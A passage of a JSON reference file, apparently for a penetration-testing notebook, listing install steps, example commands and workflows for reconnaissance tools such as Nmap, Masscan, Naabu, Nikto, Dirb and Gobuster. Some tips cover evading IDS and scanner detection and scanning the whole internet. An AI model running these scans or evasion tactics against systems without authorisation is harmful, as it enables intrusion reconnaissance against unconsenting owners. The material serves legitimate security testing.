        "scenario": "Authenticated crawling to discover internal pages.",
        "notes": [
          "Export cookies from browser DevTools for testing."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "spiderfoot",
    "name": "SpiderFoot",
    "summary": "SpiderFoot is an OSINT automation tool that integrates with numerous data sources to gather intelligence on IP addresses, domain names, email addresses, etc.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "git clone https://github.com/smicallef/spiderfoot",
            "copyable": true
          },
          {
            "detail": "cd spiderfoot",
            "copyable": true
          },
          {
            "detail": "pip3 install -r requirements.txt",
            "copyable": true
          },
          {
            "detail": "python3 sf.py -l 127.0.0.1:5001",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install from repos",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y spiderfoot",
            "copyable": true
          },
          {
            "detail": "spiderfoot -l 127.0.0.1:5001",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "docker pull spiderfoot/spiderfoot",
            "copyable": true
          },
          {
            "detail": "docker run -p 5001:5001 spiderfoot/spiderfoot",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Launch SpiderFoot web interface",
        "command": "python3 sf.py -l 127.0.0.1:5001",
        "notes": []
      },
      {
        "description": "CLI scan of domain",
        "command": "python3 sf.py -d example.com -s all -o json",
        "notes": []
      },
      {
        "description": "Scan with specific modules",
        "command": "python3 sf.py -d example.com -m sfp_dns,sfp_shodan",
        "notes": []
      },
      {
        "description": "Scan with strict correlation",
        "command": "python3 sf.py -d example.com -S -t 2",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-d",
        "description": "Target domain/IP/email"
      },
      {
        "flag": "-s",
        "description": "Scan modules to use"
      },
      {
        "flag": "-m",
        "description": "Specific modules to run"
      },
      {
        "flag": "-o",
        "description": "Output format"
      },
      {
        "flag": "-l",
        "description": "Listen address for web UI"
      },
      {
        "flag": "-S",
        "description": "Strict correlation mode"
      },
      {
        "flag": "-t",
        "description": "Maximum thread count"
      }
    ],
    "operational_tips": [
      "Use web interface for better visualization and control.",
      "Configure API keys for maximum data source coverage.",
      "Use strict correlation to reduce false positives.",
      "Export results for integration with other tools."
    ],
    "step_sequences": [
      {
        "title": "Automated OSINT collection",
        "steps": [
          {
            "title": "Start web interface",
            "details": "Launch SpiderFoot server.",
            "command": "python3 sf.py -l 127.0.0.1:5001"
          },
          {
            "title": "Create scan",
            "details": "Navigate to http://127.0.0.1:5001 and start new scan with domain target.",
            "command": "# Use web UI"
          },
          {
            "title": "Review findings",
            "details": "Examine discovered subdomains, IPs, emails, vulnerabilities.",
            "command": "# Export results from web UI"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "SpiderFoot \u2192 Vulnerability correlation",
        "stages": [
          {
            "label": "SpiderFoot scan",
            "description": "Run automated OSINT modules.",
            "command": "# Configure scan via web UI"
          },
          {
            "label": "Export CSV",
            "description": "Download findings for analysis.",
            "command": "# Export from web UI"
          },
          {
            "label": "Nuclei scanning",
            "description": "Test discovered endpoints for CVEs.",
            "command": "nuclei -l discovered_hosts.txt -t cves/"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[MODULE] DNS Resolution",
        "meaning": "SpiderFoot module actively resolving hostnames.",
        "severity": "info"
      },
      {
        "indicator": "[FINDING] Subdomain: api.example.com",
        "meaning": "New subdomain discovered via passive DNS.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "CLI-driven scan with custom modules",
        "command": "python3 sf.py -s example.com -m sfp_dnsbrute,sfp_shodan,sfp_virustotal -o json -q",
        "scenario": "Run headless scan with specific modules for automation.",
        "notes": [
          "Configure API keys in spiderfoot.yaml for enhanced results."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "nmap",
    "name": "Nmap",
    "summary": "Nmap (Network Mapper) is a powerful open-source tool for network discovery and security auditing. It discovers hosts, detects services, fingerprints OS metadata, and can execute NSE scripts for deeper checks.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install from the official repositories and keep scripts up to date.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y nmap",
            "copyable": true
          },
          {
            "detail": "nmap --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Kali ships an up-to-date Nmap plus extra NSE scripts.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y nmap nmap-common",
            "copyable": true
          },
          {
            "detail": "sudo nmap --script-updatedb",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run Nmap in a disposable container when you cannot install it locally.",
        "steps": [
          {
            "detail": "docker pull instrumenta/nmap",
            "copyable": true
          },
          {
            "detail": "docker run --rm -it instrumenta/nmap -sV scanme.nmap.org",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic TCP SYN scan (fast, stealthy)",
        "command": "sudo nmap -sS scanme.nmap.org",
        "notes": []
      },
      {
        "description": "Scan specific ports with version detection",
        "command": "sudo nmap -p 80,443 -sV example.com",
        "notes": []
      },
      {
        "description": "Aggressive scan (OS detection, scripts, traceroute)",
        "command": "sudo nmap -A 192.168.1.1",
        "notes": []
      },
      {
        "description": "Host discovery without port scan",
        "command": "sudo nmap -sn 192.168.1.0/24",
        "notes": []
      },
      {
        "description": "Full TCP scan with service detection",
        "command": "sudo nmap -p- -sV 10.0.0.5",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-sS",
        "description": "TCP SYN scan (default, stealthy)"
      },
      {
        "flag": "-sV",
        "description": "Service version detection"
      },
      {
        "flag": "-O",
        "description": "OS detection"
      },
      {
        "flag": "-A",
        "description": "Aggressive scan (OS, version, scripts, traceroute)"
      },
      {
        "flag": "-p <ports>",
        "description": "List ports or ranges (e.g., -p 80,443 or -p 1-1000)"
      },
      {
        "flag": "-T<0-5>",
        "description": "Timing template (0=slowest, 5=fastest)"
      },
      {
        "flag": "--script <name>",
        "description": "Run NSE script (e.g., --script vuln)"
      },
      {
        "flag": "-oN/-oX/-oG",
        "description": "Output to normal/XML/grepable files"
      }
    ],
    "operational_tips": [
      "Always run scans with permission and document scope clearly.",
      "Use -T4 for faster scans on reliable networks; -T2 when evading detection.",
      "Combine flags: sudo nmap -sS -sV -O -T4 target",
      "Enable verbose output with -v or --reason to inspect why ports are marked open or closed.",
      "Schedule long-running scans during maintenance windows to avoid network noise."
    ],
    "step_sequences": [
      {
        "title": "Zero-noise host discovery",
        "steps": [
          {
            "title": "ARP sweep local VLAN",
            "details": "Use ARP ping to enumerate directly connected hosts before touching routers.",
            "command": "sudo nmap -sn 10.10.0.0/24"
          },
          {
            "title": "ICMP fallback for remote ranges",
            "details": "When L2 access is unavailable rely on ICMP echo probes or trusted jump boxes.",
            "command": "sudo nmap -PE -sn scope.txt"
          },
          {
            "title": "Persist results for later phases",
            "details": "Store responsive hosts in grepable output for targeted service scans.",
            "command": "sudo nmap -sn -oG live.gnmap scope.txt"
          }
        ]
      },
      {
        "title": "Focused service validation",
        "steps": [
          {
            "title": "Enumerate top ports with banners",
            "details": "Run a fast TCP sweep that captures basic service metadata.",
            "command": "sudo nmap -sS -sV --top-ports 200 -iL live.txt -oA top200"
          },
          {
            "title": "Run targeted NSE scripts",
            "details": "Only execute scripts that match the validated services to save time.",
            "command": "sudo nmap --script safe,vuln -p80,443,445 -iL top200.gnmap"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Layered scanning workflow",
        "stages": [
          {
            "label": "Mass discovery",
            "description": "Kick off masscan or naabu to flag responsive ports at high speed.",
            "command": "sudo masscan 10.0.0.0/16 -p80,443 --rate 10000 -oL fast.txt"
          },
          {
            "label": "Service validation",
            "description": "Feed responsive hosts into Nmap for accurate service/OS fingerprinting.",
            "command": "sudo nmap -sS -sV -iL fast.txt --top-ports 200 -oA validation"
          },
          {
            "label": "Scripted follow-up",
            "description": "Launch NSE scripts only against the services that matter most.",
            "command": "sudo nmap --script vuln,safe -iL validation.gnmap -oN scripts.txt"
          },
          {
            "label": "Reporting",
            "description": "Export grepable output for notebooks and tracking dashboards.",
            "command": "sudo nmap -iL fast.txt -oG final.gnmap"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Host is up (0.000s latency).",
        "meaning": "Target responded to discovery probes. Expect accompanying PORT lines soon after.",
        "severity": "info"
      },
      {
        "indicator": "PORT   STATE SERVICE",
        "meaning": "Header row describing the columns that follow. STATE values of open/closed/filtered map directly to the TCP handshake result.",
        "severity": "info"
      },
      {
        "indicator": "Warning: OSScan results may be unreliable...",
        "meaning": "OS detection needs at least one open and one closed port. Provide more targets or explicitly scan additional ports.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Stealthy full TCP fingerprinting",
        "scenario": "Blend service, OS and script data in a single sweep against mid-sized networks.",
        "command": "sudo nmap -p- -sS -sV -O --reason --max-retries 1 -iL live.txt -oA full-spectrum",
        "notes": [
          "Tune --scan-delay/--max-rate on fragile networks to avoid tripping IDS baseline checks."
        ]
      },
      {
        "title": "IPv6 neighbor discovery and scan",
        "scenario": "Enumerate dual-stack hosts that may not appear in IPv4 scopes.",
        "command": "sudo nmap -6 -sV -Pn 2001:db8:10::/64",
        "notes": [
          "Combine with --script ipv6-node-info,targets-ipv6-multicast for richer SLAAC findings."
        ]
      }
    ],
    "comparison_table": {
      "caption": "Choosing the right scanner",
      "columns": [
        "Capability",
        "Nmap",
        "Masscan",
        "Naabu"
      ],
      "rows": [
        [
          "Speed",
          "Balanced (tunable with -T0..-T5)",
          "Extremely fast (millions of packets/sec)",
          "Fast (Go-based, moderate accuracy)"
        ],
        [
          "Coverage",
          "TCP/UDP, service/OS detection, NSE automation",
          "TCP only, stateless",
          "TCP with lightweight banner grabbing"
        ],
        [
          "Best use case",
          "Validation and deep reconnaissance",
          "Huge address ranges or early sweeps",
          "Mid-sized web/service enumerations"
        ]
      ]
    },
    "resources": [
      {
        "label": "Nmap Reference Guide",
        "url": "https://nmap.org/book/man.html",
        "description": "Official documentation for every option and timing nuance."
      },
      {
        "label": "NSE Script Gallery",
        "url": "https://nmap.org/nsedoc/",
        "description": "Searchable catalog of bundled scripts with usage notes."
      },
      {
        "label": "Nmap cheat sheet",
        "url": "https://highon.coffee/blog/nmap-cheat-sheet/",
        "description": "Community-maintained reminders for offensive and defensive teams."
      }
    ]
  },
  {
    "id": "masscan",
    "name": "Masscan",
    "summary": "Masscan is an Internet-scale port scanner capable of sending millions of packets per second. Use it for rapid discovery before deeper Nmap scans.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Build from source for latest features",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y git gcc make libpcap-dev",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/robertdavidgraham/masscan",
            "copyable": true
          },
          {
            "detail": "cd masscan && make -j",
            "copyable": true
          },
          {
            "detail": "sudo make install",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed package",
        "steps": [
          {
            "detail": "sudo apt install -y masscan",
            "copyable": true
          },
          {
            "detail": "masscan --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Containerized execution with network access",
        "steps": [
          {
            "detail": "docker pull ivre/masscan",
            "copyable": true
          },
          {
            "detail": "docker run --rm --net=host ivre/masscan -p80,443 192.168.1.0/24",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Scan top 100 ports on a subnet",
        "command": "sudo masscan 10.0.0.0/24 --top-ports 100 --rate 5000",
        "notes": []
      },
      {
        "description": "Full TCP scan of a host",
        "command": "sudo masscan 203.0.113.5 -p0-65535 --rate 10000",
        "notes": []
      },
      {
        "description": "Slow scan to avoid detection",
        "command": "sudo masscan 198.51.100.0/24 -p80,443 --rate 100",
        "notes": []
      },
      {
        "description": "Scan known ports with banner grab",
        "command": "sudo masscan 192.168.56.0/24 -p22,80,445 --banners",
        "notes": []
      },
      {
        "description": "Exclude sensitive ranges",
        "command": "sudo masscan 0.0.0.0/0 -p443 --excludefile exclude.txt",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-p/-p0-65535",
        "description": "Port or port range"
      },
      {
        "flag": "--top-ports <n>",
        "description": "Scan the most common ports"
      },
      {
        "flag": "--rate",
        "description": "Packets per second"
      },
      {
        "flag": "--adapter-ip/port",
        "description": "Bind to a specific source IP/port"
      },
      {
        "flag": "--router-ip",
        "description": "Send packets via alternate gateway"
      },
      {
        "flag": "--banners",
        "description": "Grab basic service banners"
      },
      {
        "flag": "--exclude/--excludefile",
        "description": "Skip sensitive networks"
      },
      {
        "flag": "-oX/-oJ/-oL",
        "description": "Output XML/JSON/list formats"
      }
    ],
    "operational_tips": [
      "Masscan requires root; consider --rate to respect network capacity.",
      "Use results as input to slower but deeper Nmap scans.",
      "Always exclude production ranges if not in scope.",
      "Plan scans during maintenance to avoid IDS alerts."
    ],
    "step_sequences": [
      {
        "title": "Internet-scale port discovery",
        "steps": [
          {
            "title": "Configure exclusions",
            "details": "Create exclude.txt with out-of-scope networks to honor ROE.",
            "command": "echo '192.168.0.0/16' > exclude.txt"
          },
          {
            "title": "Launch fast sweep",
            "details": "Scan entire ranges at millions of packets/second.",
            "command": "sudo masscan 10.0.0.0/8 -p80,443,8080,8443 --rate 10000 --excludefile exclude.txt -oG masscan.gnmap"
          },
          {
            "title": "Parse results",
            "details": "Extract open ports for Nmap follow-up.",
            "command": "grep 'Host:' masscan.gnmap | awk '{print $2}' | sort -u > live_hosts.txt"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Mass discovery \u2192 Nmap validation",
        "stages": [
          {
            "label": "Masscan sweep",
            "description": "Quickly identify live services across huge ranges.",
            "command": "sudo masscan 10.0.0.0/16 -p1-65535 --rate 50000 -oL masscan.list"
          },
          {
            "label": "Nmap deep scan",
            "description": "Validate and fingerprint services on discovered hosts.",
            "command": "nmap -sV -sC -iL masscan.list -oA detailed"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Discovered open port 80/tcp on 10.0.1.5",
        "meaning": "Masscan found a responsive port; follow up with Nmap for service details.",
        "severity": "info"
      },
      {
        "indicator": "rate: 10000.00 kpps",
        "meaning": "Current packet rate; tune with --rate to balance speed vs. network stability.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Banners and application detection",
        "command": "sudo masscan 192.168.0.0/16 -p80,443,8080 --banners --rate 10000 -oJ masscan.json",
        "scenario": "Grab banners inline to identify web servers and load balancers.",
        "notes": [
          "Combine with --source-ip when scanning through multiple interfaces."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "naabu",
    "name": "Naabu",
    "summary": "Naabu is a fast port scanner written in Go that allows you to enumerate valid ports for hosts in a fast and reliable manner.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt install -y golang-go",
            "copyable": true
          },
          {
            "detail": "go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",
            "copyable": true
          },
          {
            "detail": "export PATH=$PATH:~/go/bin",
            "copyable": true
          },
          {
            "detail": "naabu -version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install from Go or use pre-built binary",
        "steps": [
          {
            "detail": "sudo apt install -y golang",
            "copyable": true
          },
          {
            "detail": "go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run via ProjectDiscovery image",
        "steps": [
          {
            "detail": "docker pull projectdiscovery/naabu",
            "copyable": true
          },
          {
            "detail": "docker run --rm projectdiscovery/naabu -host example.com",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic port scan",
        "command": "naabu -host example.com",
        "notes": []
      },
      {
        "description": "Scan with top 1000 ports",
        "command": "naabu -host 192.168.1.1 -top-ports 1000",
        "notes": []
      },
      {
        "description": "Fast scan with JSON output",
        "command": "naabu -host example.com -json -o results.json",
        "notes": []
      },
      {
        "description": "Scan multiple hosts",
        "command": "naabu -list hosts.txt -p 80,443,8080",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-host",
        "description": "Target host to scan"
      },
      {
        "flag": "-list",
        "description": "File with target hosts"
      },
      {
        "flag": "-p",
        "description": "Ports to scan"
      },
      {
        "flag": "-top-ports",
        "description": "Scan top N ports"
      },
      {
        "flag": "-json",
        "description": "JSON output format"
      },
      {
        "flag": "-o",
        "description": "Output file"
      },
      {
        "flag": "-rate",
        "description": "Packets per second"
      }
    ],
    "operational_tips": [
      "Use JSON output for easy integration with other tools.",
      "Adjust rate to balance speed and stealth.",
      "Combine with Nmap for detailed service detection.",
      "Use CIDR notation for network scanning."
    ],
    "step_sequences": [
      {
        "title": "Fast port scanning workflow",
        "steps": [
          {
            "title": "Single host scan",
            "details": "Enumerate all ports on a target quickly.",
            "command": "naabu -host example.com -p - -o naabu_output.txt"
          },
          {
            "title": "Subnet scan",
            "details": "Scan multiple hosts from file or CIDR.",
            "command": "naabu -list targets.txt -p 80,443,8080,8443 -o web_ports.txt"
          },
          {
            "title": "Service integration",
            "details": "Pipe results to httpx for web service probing.",
            "command": "cat naabu_output.txt | httpx -silent -o live_web.txt"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Naabu \u2192 Nuclei pipeline",
        "stages": [
          {
            "label": "Port discovery",
            "description": "Identify all open ports rapidly.",
            "command": "naabu -host example.com -p - -json -o ports.json"
          },
          {
            "label": "HTTP probing",
            "description": "Find live web services.",
            "command": "cat ports.json | jq -r '.host + \":\" + (.port|tostring)' | httpx -silent -o services.txt"
          },
          {
            "label": "Vulnerability scanning",
            "description": "Run Nuclei templates against live services.",
            "command": "nuclei -list services.txt -t cves/ -o findings.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "example.com:443",
        "meaning": "Open port found; format is host:port for easy piping.",
        "severity": "info"
      },
      {
        "indicator": "[INF] Running SYN scan with root privileges",
        "meaning": "Naabu detected sudo/root and switched to faster SYN scanning.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Rate-limited stealth scan",
        "command": "naabu -host 192.168.1.0/24 -p - -rate 1000 -retries 2 -timeout 5000 -o stealthy.txt",
        "scenario": "Reduce scan rate and increase timeouts to evade IDS/IPS.",
        "notes": [
          "Combine with -exclude-ports to skip honeypot services."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "nikto",
    "name": "Nikto",
    "summary": "Nikto is a web server scanner that performs comprehensive tests against web servers to find dangerous files/programs and outdated versions.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y nikto",
            "copyable": true
          },
          {
            "detail": "nikto -Version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed",
        "steps": [
          {
            "detail": "nikto -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "docker pull securecodebox/nikto",
            "copyable": true
          },
          {
            "detail": "docker run --rm securecodebox/nikto -h http://example.com",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic web server scan",
        "command": "nikto -h https://example.com",
        "notes": []
      },
      {
        "description": "Scan with custom user agent",
        "command": "nikto -h https://example.com -useragent 'Custom Scanner 1.0'",
        "notes": []
      },
      {
        "description": "Scan specific port",
        "command": "nikto -h 192.168.1.1 -p 8080",
        "notes": []
      },
      {
        "description": "Save output to file",
        "command": "nikto -h https://example.com -o nikto_results.html -Format htm",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-h",
        "description": "Target host/IP"
      },
      {
        "flag": "-p",
        "description": "Port to scan"
      },
      {
        "flag": "-useragent",
        "description": "Custom user agent"
      },
      {
        "flag": "-o",
        "description": "Output file"
      },
      {
        "flag": "-Format",
        "description": "Output format (csv, htm, txt, xml)"
      },
      {
        "flag": "-Tuning",
        "description": "Scan tuning options"
      },
      {
        "flag": "-Plugins",
        "description": "Plugins to use/skip"
      }
    ],
    "operational_tips": [
      "Use custom user agents to avoid scanner detection.",
      "Save results in HTML format for easy reporting.",
      "Tune scanning options to reduce noise on sensitive targets.",
      "Combine with other web scanners for comprehensive coverage."
    ],
    "step_sequences": [
      {
        "title": "Web server vulnerability scanning",
        "steps": [
          {
            "title": "Basic scan",
            "details": "Scan a web server for known issues.",
            "command": "nikto -h http://example.com"
          },
          {
            "title": "SSL/TLS scan",
            "details": "Test HTTPS sites.",
            "command": "nikto -h https://example.com -ssl"
          },
          {
            "title": "Save report",
            "details": "Output findings to HTML.",
            "command": "nikto -h http://example.com -o nikto_report.html -Format html"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Nikto \u2192 Manual verification \u2192 Exploit testing",
        "stages": [
          {
            "label": "Nikto scan",
            "description": "Identify potential vulnerabilities.",
            "command": "nikto -h https://app.example.com -o nikto.txt"
          },
          {
            "label": "Review findings",
            "description": "Filter false positives and prioritize.",
            "command": "grep -i 'OSVDB' nikto.txt"
          },
          {
            "label": "Manual testing",
            "description": "Verify findings with Burp Suite or curl.",
            "command": "curl -v https://app.example.com/admin"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "+ OSVDB-3092: /admin/: This might be interesting",
        "meaning": "Nikto found a potentially sensitive directory.",
        "severity": "warning"
      },
      {
        "indicator": "+ Server: Apache/2.4.41",
        "meaning": "Web server version detected; check for CVEs.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Tuned scan with custom plugins",
        "command": "nikto -h http://example.com -Tuning 123456789 -Display V -o detailed.html",
        "scenario": "Enable all tuning categories for comprehensive testing.",
        "notes": [
          "Use -mutate for username/password guessing against auth endpoints."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "dirb",
    "name": "Dirb",
    "summary": "Dirb is a Web Content Scanner that looks for existing (and/or hidden) Web Objects by brute force crawling the web server.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y dirb",
            "copyable": true
          },
          {
            "detail": "dirb",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed",
        "steps": [
          {
            "detail": "dirb http://example.com",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "docker run --rm kalilinux/kali-rolling dirb http://example.com",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic directory scan",
        "command": "dirb https://example.com",
        "notes": []
      },
      {
        "description": "Scan with custom wordlist",
        "command": "dirb https://example.com /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        "notes": []
      },
      {
        "description": "Scan with file extensions",
        "command": "dirb https://example.com -X .php,.html,.txt",
        "notes": []
      },
      {
        "description": "Save output to file",
        "command": "dirb https://example.com -o dirb_results.txt",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-a",
        "description": "User agent"
      },
      {
        "flag": "-c",
        "description": "Cookie string"
      },
      {
        "flag": "-X",
        "description": "File extensions to scan"
      },
      {
        "flag": "-o",
        "description": "Output file"
      },
      {
        "flag": "-r",
        "description": "Don't stop on warnings"
      },
      {
        "flag": "-S",
        "description": "Silent mode"
      },
      {
        "flag": "-v",
        "description": "Verbose mode"
      }
    ],
    "operational_tips": [
      "Use comprehensive wordlists for better results.",
      "Combine with multiple file extensions for thorough coverage.",
      "Save results for analysis and later testing.",
      "Consider rate limiting to avoid detection."
    ],
    "step_sequences": [
      {
        "title": "Directory brute forcing",
        "steps": [
          {
            "title": "Default wordlist scan",
            "details": "Use built-in wordlist.",
            "command": "dirb http://example.com"
          },
          {
            "title": "Custom wordlist",
            "details": "Provide your own directory list.",
            "command": "dirb http://example.com /usr/share/seclists/Discovery/Web-Content/common.txt"
          },
          {
            "title": "Save results",
            "details": "Output to file.",
            "command": "dirb http://example.com -o dirb_results.txt"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Dirb \u2192 Content review \u2192 Nikto deep scan",
        "stages": [
          {
            "label": "Directory discovery",
            "description": "Find hidden paths.",
            "command": "dirb http://example.com /usr/share/dirb/wordlists/big.txt -o dirb.txt"
          },
          {
            "label": "Interesting paths",
            "description": "Identify admin panels, backups, etc.",
            "command": "grep '200' dirb.txt"
          },
          {
            "label": "Vulnerability scan",
            "description": "Run Nikto on discovered directories.",
            "command": "nikto -h http://example.com/admin/"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "+ http://example.com/admin/ (CODE:200|SIZE:1234)",
        "meaning": "Directory found with HTTP 200 response.",
        "severity": "warning"
      },
      {
        "indicator": "+ http://example.com/backup.zip (CODE:200|SIZE:5678)",
        "meaning": "Potentially sensitive file discovered.",
        "severity": "critical"
      }
    ],
    "advanced_usage": [
      {
        "title": "Recursive scan with extensions",
        "command": "dirb http://example.com /usr/share/dirb/wordlists/common.txt -r -X .php,.txt,.bak",
        "scenario": "Recursively scan found directories and test for specific file extensions.",
        "notes": [
          "Use -w to avoid waiting between requests on stable networks."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "gobuster",
    "name": "Gobuster",
    "summary": "Gobuster is a multithreaded directory, DNS, and virtual host brute-forcing tool. It is perfect for quickly finding hidden web content when you already know the hostname or base URL.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt install -y golang",
            "copyable": true
          },
          {
            "detail": "go install github.com/OJ/gobuster/v3@latest",
            "copyable": true
          },
          {
            "detail": "export PATH=$PATH:~/go/bin",
            "copyable": true
          },
          {
            "detail": "gobuster version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed or via apt",
        "steps": [
          {
            "detail": "sudo apt install -y gobuster",
            "copyable": true
          },
          {
            "detail": "gobuster -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "docker pull gobuster/gobuster",
            "copyable": true
          },
          {
            "detail": "docker run --rm gobuster/gobuster dir -u http://example.com -w /wordlist.txt",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Directory/file brute-forcing (dir mode)",
        "command": "gobuster dir -u http://example.com -w data/wordlists/common.txt",
        "notes": []
      },
      {
        "description": "DNS subdomain enumeration",
        "command": "gobuster dns -d example.com -w data/wordlists/subdomains.txt",
        "notes": []
      },
      {
        "description": "Virtual host discovery",
        "command": "gobuster vhost -u http://example.com -w data/wordlists/vhosts.txt",
        "notes": []
      },
      {
        "description": "Directory scan with extensions and status filters",
        "command": "gobuster dir -u https://example.com -w data/wordlists/common.txt -x php,txt,bak -s 200,204,301,302,403",
        "notes": []
      },
      {
        "description": "Authenticated scan with cookies",
        "command": "gobuster dir -u https://portal.example.com -w data/wordlists/common.txt -c 'session=abcd1234'",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "dir/dns/vhost",
        "description": "Choose directory, DNS, or virtual host mode"
      },
      {
        "flag": "-u/-d",
        "description": "Target base URL (-u) or domain (-d)"
      },
      {
        "flag": "-w <wordlist>",
        "description": "Path to the wordlist file"
      },
      {
        "flag": "-x <extensions>",
        "description": "Comma-separated extensions to append"
      },
      {
        "flag": "-t <threads>",
        "description": "Adjust concurrency (default 10)"
      },
      {
        "flag": "-s/-b",
        "description": "Positive (-s) or blacklist (-b) status codes"
      },
      {
        "flag": "-a/-c/-H",
        "description": "Set User-Agent (-a), cookies (-c), or custom header (-H)"
      },
      {
        "flag": "--delay",
        "description": "Add delay between requests to avoid throttling"
      }
    ],
    "operational_tips": [
      "Use smaller wordlists first to confirm interesting responses, then scale up.",
      "Leverage PT Journal wordlists in data/wordlists/ or swap in SecLists.",
      "Always review HTTP status codes; -s 200,204,301,302,307,401,403 keeps useful hits.",
      "Add -x php,asp,bak for common backup files.",
      "Combine Gobuster output with proxy logs for deeper insights."
    ],
    "step_sequences": [
      {
        "title": "Directory and subdomain enumeration",
        "steps": [
          {
            "title": "Directory brute force",
            "details": "Find hidden paths on web server.",
            "command": "gobuster dir -u http://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"
          },
          {
            "title": "Virtual host discovery",
            "details": "Enumerate vhosts on target.",
            "command": "gobuster vhost -u http://example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
          },
          {
            "title": "Subdomain enumeration",
            "details": "DNS-based subdomain brute force.",
            "command": "gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Gobuster \u2192 Feroxbuster \u2192 Manual verification",
        "stages": [
          {
            "label": "Initial discovery",
            "description": "Quick scan with Gobuster.",
            "command": "gobuster dir -u https://example.com -w common.txt -o gobuster.txt"
          },
          {
            "label": "Recursive deep scan",
            "description": "Use Feroxbuster for thorough crawling.",
